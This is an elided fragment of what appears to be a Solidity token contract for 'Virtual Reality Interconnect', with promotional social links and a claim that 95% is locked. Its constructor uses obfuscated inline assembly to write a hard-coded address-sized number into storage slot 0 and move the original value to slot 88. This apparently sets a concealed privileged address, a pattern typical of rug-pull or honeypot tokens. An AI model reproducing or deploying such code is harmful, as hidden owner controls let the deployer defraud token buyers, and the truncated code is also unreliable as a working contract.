/*
Welcome to Virtual Reality Interconnect Metaverse.

Telegram: https://t.me/VirtualRealityInterconnect/
Twitter: https://twitter.com/VirtualRealityInterconnect/
Website: https://VirtualRealityInterconnect.finance
95% - LOCKED
...
contract VirtualRealityInterconnect {
    string public constant name = "Virtual Reality Interconnect";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1009724252342139535081527364905410316150995986357, 1))}
